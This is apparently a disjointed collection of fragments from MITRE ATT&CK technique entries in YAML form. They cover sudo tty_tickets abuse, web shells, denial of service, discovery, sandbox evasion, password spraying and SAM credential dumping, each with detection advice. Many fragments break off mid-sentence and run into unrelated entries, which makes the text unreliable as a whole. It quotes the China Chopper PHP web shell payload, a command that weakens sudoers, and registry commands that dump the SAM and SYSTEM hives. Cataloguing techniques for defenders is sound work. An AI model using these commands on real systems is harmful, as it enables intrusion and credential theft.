        user's password. When <code>tty_tickets</code> is disabled, adversaries can
        do this from any tty for that user. \n\nThe OSX Proton Malware has disabled
        <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo
        \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>  (Citation: cybereason
        osx proton). In order for this change to be reflected, the Proton malware
        also must issue <code>killall Terminal</code>. As of macOS Sierra, the sudoers
        file has <code>tty_tickets</code> enabled by default."

        account using Credential Access techniques or capture credentials earlier
        in their reconnaissance process through social engineering for means of gaining
        Initial Access. \n\nAccounts that an adversary may use can fall into three
        categories: default, local, and domain accounts. Default accounts are those
        that are built-into an OS such as Guest or Administrator account on Windows
        systems or default factory/provider set accounts on other types of systems,
        software, or devices. Local accounts are those configured by an organization
        for use by users, remote support, services, or for administration on a single
        system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts
        are those managed by Active Directory Domain Services where access and permissions
        are configured across systems and services that are part of that domain. Domain
        accounts can cover users, administrators, and services.\n\nCompromised credentials
        may be used to bypass access controls placed on various resources on systems
        within the network and may even be used for persistent access to remote systems
        and externally available services, such as VPNs, Outlook Web Access and remote
        desktop. Compromised credentials may also grant an adversary increased privilege
        to specific systems or access to restricted areas of the network. Adversaries
        may choose not to use malware or tools in conjunction with the legitimate
        access those credentials provide to make it harder to detect their presence.\n\nDefault
        accounts are also not limited to Guest and Administrator on client machines,
        they also include accounts that are preset for equipment such as network devices
        and computer applications whether they are internal, open source, or COTS.
        Appliances that come preset with a username and password combination pose
        a serious threat to organizations that do not change it post installation,
        as they are easy targets for an adversary. Similarly, adversaries may also
        utilize publicly disclosed private keys, or stolen private keys, to legitimately
        connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021)
        (Citation: Metasploit SSH Module)\n\nThe overlap of account access, credentials,
        and permissions across a network of systems is of concern because the adversary
        may be able to pivot across accounts and systems to reach a high level of
        access (i.e., domain or enterprise administrator) to bypass access controls
        set within the enterprise. (Citation: TechNet Credential Theft)"

        A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)

        Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.

        Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)

        <code><?php @eval($_POST['password']);></code>

        Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [cmd](https://attack.mitre.org/software/S0106) or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)

        Use process monitoring to monitor the execution and command line parameters of binaries involved in deleting accounts or changing passwords, such as use of [Net](https://attack.mitre.org/software/S0039). Windows event logs may also designate activity associated with an adversary's attempt to remove access to an account:

        * Event ID 4723 - An attempt was made to change an account's password
        * Event ID 4724 - An attempt was made to reset an account's password
        * Event ID 4726 - A user account was deleted
        * Event ID 4740 - A user account was locked out

        Alerting on [Net](https://attack.mitre.org/software/S0039) and these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.

      description: |-
        Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.

      name: Endpoint Denial of Service
      description: |-
        Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)

        An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).

        To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.

        Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.

        Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)

        In cases where traffic manipulation is used, there may be points in the the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)

        For attacks attempting to saturate the providing network, see the Network Denial of Service Technique [Network Denial of Service](https://attack.mitre.org/techniques/T1498).

        ### OS Exhaustion Flood
        Since operating systems (OSs) are responsible for managing the finite resources on a system, they can be a target for DoS. These attacks do not need to exhaust the actual resources on a system since they can simply exhaust the limits that an OS self-imposes to prevent the entire system from being overwhelmed by excessive demands on its capacity. Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018)

        #### SYN Flood
        With SYN floods excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)

        #### ACK Flood
        ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)

        ### Service Exhaustion Flood
        Different network services provided by systems are targeted in different ways to conduct a DoS. Adversaries often target DNS and web servers, but other services have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.

        #### Simple HTTP Flood
        A large number of HTTP requests can be issued to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)

        #### SSL Renegotiation Attack
        SSL Renegotiation Attacks take advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)

        ### Application Exhaustion Flood
        Web applications that sit on top of web server stacks can be targeted for DoS. Specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)

        ### Application or System Exploitation
        Software vulnerabilities exist that when exploited can cause an application or system to crash and deny availability to users.(Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent DoS condition.

        Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.

        In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.

        Externally monitor the availability of services that may be targeted by an Endpoint DoS.

      name: Network Denial of Service
      description: |-
        Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)

        A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS). Many different methods to accomplish such network saturation have been observed, but most fall into two main categories: Direct Network Floods and Reflection Amplification.

        To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.

        Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.

        Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)

        For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).

        ###Direct Network Flood###

        Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for Direct Network Floods. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.

        ###Reflection Amplification###

        Adversaries may amplify the volume of their attack traffic by using Reflection. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflector may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017)

        Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)

        the traffic volume is sufficient to cause impact to the availability of the

        and responsiveness or services provided by an upstream network service provider.
        Typical network throughput monitoring tools such as netflow(Citation: Cisco
        DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases
        in network or service utilization. Real-time, automated, and qualitative study
        of the network traffic can identify a sudden surge in one type of protocol

        may be small and the indicator of an event availability of the network or
        service drops. The analysis tools mentioned can then be used to determine
        the type of DoS causing the outage and help with remediation.'

      description: "Adversaries may attempt to get a listing of local system or domain
        accounts. \n\n### Windows\n\nExample commands that can acquire this information
        are <code>net user</code>, <code>net group <groupname></code>, and <code>net
        localgroup <groupname></code> using the [Net](https://attack.mitre.org/software/S0039)
        utility or through use of [dsquery](https://attack.mitre.org/software/S0105).
        If adversaries attempt to identify the primary user, currently logged in user,
        or set of users that commonly uses a system, [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033)
        may apply.\n\n### Mac\n\nOn Mac, groups can be enumerated through the <code>groups</code>
        and <code>id</code> commands. In mac specifically, <code>dscl . list /Groups</code>
        and <code>dscacheutil -q group</code> can also be used to enumerate groups
        and users.\n\n### Linux\n\nOn Linux, local users can be enumerated through
        the use of the <code>/etc/passwd</code> file which is world readable. In mac,
        this same file is only used in single-user mode in addition to the <code>/etc/master.passwd</code>
        file.\n\nAlso, groups can be enumerated through the <code>groups</code> and
        <code>id</code> commands.\n\n### Office 365 and Azure AD\n\nWith authenticated
        access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code>
        PowerShell cmdlet can be used to obtain account names given a role or permissions
        group.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance)\n\nAzure
        CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated
        access to a domain. The command <code>az ad user list</code> will list all
        users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red
        Teaming MS AD Azure, 2018) \n\nThe <code>Get-GlobalAddressList</code> PowerShell
        cmdlet can be used to obtain email addresses and accounts from a domain using
        an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation:

        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).

        Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

        Normal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.

        Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        ### Windows

        Example utilities used to obtain this information are <code>dir</code> and <code>tree</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the Windows API.

        ### Mac and Linux

        In Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, <code>find</code>, and <code>locate</code> commands.

        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.

        Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

        Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and Relay](https://attack.mitre.org/techniques/T1171), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

        Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) necessary for follow-on Lateral Movement and/or Defense Evasion activities.

      x_mitre_detection: Detecting the events leading up to sniffing network traffic
        may be the best method of detection. From the host level, an adversary would
        likely need to perform a man-in-the-middle attack against other devices on
        a wired network in order to capture traffic that was not to or from the current
        compromised system. This change in the flow of information is detectable at
        the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts.
        Detecting compromised network devices is a bit more challenging. Auditing
        administrator logins, configuration changes, and device images is required
        to detect malicious changes.

      description: |-
        Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). An adversary may attempt to access detailed information about the password policy used within an enterprise network. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

        Password policies can be set and discovered on Windows, Linux, and macOS systems. (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)

        Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1063) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.


        ### Windows

        Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.

        ### Mac

        It's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.

        An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        ### Windows

        Example commands and utilities that obtain this information include <code>ver</code>, [Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within [cmd](https://attack.mitre.org/software/S0106) for identifying information based on present files and directories.

        ### Mac

        On Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.

        In Amazon Web Services (AWS), the Application Discovery Service may be used by an adversary to identify servers, virtual machines, software, and software dependencies running.(Citation: Amazon System Discovery)

        ### GCP

        On Google Cloud Platform (GCP) <code>GET /v1beta1/{parent=organizations/*}/assets</code> or <code>POST /v1beta1/{parent=organizations/*}/assets:runDiscovery</code> may be used to list an organizations cloud assets, or perform asset discovery on a cloud environment.(Citation: Google Command Center Dashboard)

They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs.

        The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)

        An adversary may gather the system time and/or time zone from a local or remote system. This information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service) The information could be useful for performing other techniques, such as executing a file with a [Scheduled Task](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting.

      description: "Adversaries may check for the presence of a virtual machine environment
        (VME) or sandbox to avoid potential detection of tools and activities. If
        the adversary detects a VME, they may alter their malware to conceal the core
        functions of the implant or disengage from the victim. They may also search
        for VME artifacts before dropping secondary or additional payloads. Adversaries
        may use the information from learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
        during automated discovery to shape follow-on behaviors.\n\nAdversaries may
        use several methods including [Security Software Discovery](https://attack.mitre.org/techniques/T1063)
        to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
        by searching for security monitoring tools (e.g., Sysinternals, Wireshark,
        etc.) to help determine if it is an analysis environment. Additional methods
        include use of sleep timers or loops within malware code to avoid operating
        within a temporary sandboxes. (Citation: Unit 42 Pirpi July 2015)\n\n###Virtual
        Machine Environment Artifacts Discovery###\n\nAdversaries may use utilities
        such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047),
        [PowerShell](https://attack.mitre.org/techniques/T1086), [Systeminfo](https://attack.mitre.org/software/S0096),
        and the [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain
        system information and search for VME artifacts. Adversaries may search for
        VME artifacts in memory, processes, file system, and/or the Registry. Adversaries
        may use [Scripting](https://attack.mitre.org/techniques/T1064) to combine
        these checks into one script and then have the program exit if it determines
        the system to be a virtual environment. Also, in applications like VMWare,
        adversaries can use a special I/O port to send commands and receive output.
        Adversaries may also check the drive size. For example, this can be done using
        the Win32 DeviceIOControl function. \n\nExample VME Artifacts in the Registry(Citation:
        McAfee Virtual Jan 2017)\n\n* <code>HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest
        Additions</code>\n* <code>HKLM\\HARDWARE\\Description\\System\\”SystemBiosVersion”;”VMWARE”</code>\n*
        <code>HKLM\\HARDWARE\\ACPI\\DSDT\\BOX_</code>\n\nExample VME files and DLLs
        on the system(Citation: McAfee Virtual Jan 2017)\n\n* <code>WINDOWS\\system32\\drivers\\vmmouse.sys</code>
        \n* <code>WINDOWS\\system32\\vboxhook.dll</code>\n* <code>Windows\\system32\\vboxdisp.dll</code>\n\nCommon
        checks may enumerate services running that are unique to these applications,
        installed programs on the system, manufacturer/product fields for strings
        relating to virtual machine applications, and VME-specific hardware/processor
        instructions.(Citation: McAfee Virtual Jan 2017)\n\n###User Activity Discovery###\n\nAdversaries
        may search for user activity on the host (e.g., browser history, cache, bookmarks,
        number of files in the home directories, etc.) for reassurance of an authentic
        environment. They might detect this type of information via user interaction
        and digital signatures. They may have malware check the speed and frequency
        of mouse clicks to determine if it’s a sandboxed environment.(Citation: Sans
        Virtual Jan 2016) Other methods may rely on specific user interaction with
        the system before the malicious code is activated. Examples include waiting
        for a document to close before activating a macro (Citation: Unit 42 Sofacy
        Nov 2018) and waiting for a user to double click on an embedded image to activate
        (Citation: FireEye FIN7 April 2017).\n\n###Virtual Hardware Fingerprinting
        Discovery###\n\nAdversaries may check the fan and temperature of the system
        to gather evidence that can be indicative a virtual environment. An adversary
        may perform a CPU check using a WMI query <code>$q = “Select * from Win32_Fan”
        Get-WmiObject -Query $q</code>. If the results of the WMI query return more
        than zero elements, this might tell them that the machine is a physical one.

      name: Account Manipulation
      description: |-
        Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.

        ### Exchange Email Account Takeover

        The Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission) This command can be run, given adequate permissions, to further access granted to certain user accounts. This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)

        ### Azure AD

        In Azure, an adversary can set a second password for Service Principals, facilitating persistence.(Citation: Blue Cloud of Death)

        ### AWS

        AWS policies allow trust between accounts by simply identifying the account name. It is then up to the trusted account to only allow the correct roles to have access.(Citation: Summit Route Advanced AWS policy auditing)

Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)

        Use of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.

        Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.

        A larger volume of emails sent from an account than normal and the discovery of similar phishing emails being sent from real accounts within a network may be signs that an account may have been compromised and attempts to leverage access with modified email permissions is occurring.

        Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.

        [Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)

        Adversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

        A related technique called password spraying uses one password (e.g. 'Password01'), or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

        Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

        * SSH (22/TCP)
        * Telnet (23/TCP)
        * FTP (21/TCP)
        * NetBIOS / SMB / Samba (139/TCP & 445/TCP)
        * LDAP (389/TCP)
        * Kerberos (88/TCP)
        * RDP / Terminal Services (3389/TCP)
        * HTTP/HTTP Management Services (80/TCP & 443/TCP)
        * MSSQL (1433/TCP)
        * Oracle (1521/TCP)
        * MySQL (3306/TCP)
        * VNC (5900/TCP)

        In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)


        In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

        Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.

        Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API)

        If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)

        The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.

        Movement and access restricted information.\n\nSeveral of the tools mentioned
        in this technique may be used by both adversaries and professional security
        testers. Additional custom tools likely exist as well.\n\n### Windows\n\n####
        SAM (Security Accounts Manager)\n\nThe SAM is a database file that contains
        local accounts for the host, typically those found with the ‘net user’ command.
        To enumerate the SAM database, system level access is required.\n \nA number
        of tools can be used to retrieve the SAM file through in-memory techniques:\n\n*
        pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n*
        secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry
        with [Reg](https://attack.mitre.org/software/S0075):\n\n* <code>reg save HKLM\\sam
        sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then
        be used to process the SAM database locally to retrieve hashes. (Citation:
        GitHub Creddump7)\n\nNotes:\nRid 500 account is the local, in-built administrator.\nRid
        501 is the guest account.\nUser accounts start with a RID of 1,000+.\n\n####
        Cached Credentials\n\nThe DCC2 (Domain Cached Credentials version 2) hash,
        used by Windows Vista and newer caches credentials when the domain controller
        is unavailable. The number of default cached credentials varies, and this
        number can be altered per system. This hash does not allow pass-the-hash style
        attacks.\n \nA number of tools can be used to retrieve the SAM file through
        in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n*

        can be used to extract from the Registry and Creddump7 used to gather the
        credentials.\n\nNotes:\nCached credentials for Windows Vista are derived using
        PBKDF2.\n\n#### Local Security Authority (LSA) Secrets\n\nWith SYSTEM access
        to a host, the LSA secrets often allows trivial access from a local account
        to domain-based account credentials. The Registry is used to store the LSA
        secrets.\n \nWhen services are run under the context of local or domain users,
        their passwords are stored in the Registry. If auto-logon is enabled, this
        information will be stored in the Registry as well.\n \nA number of tools
        can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe

        secretsdump.py\n\nAlternatively, reg.exe can be used to extract from the Registry
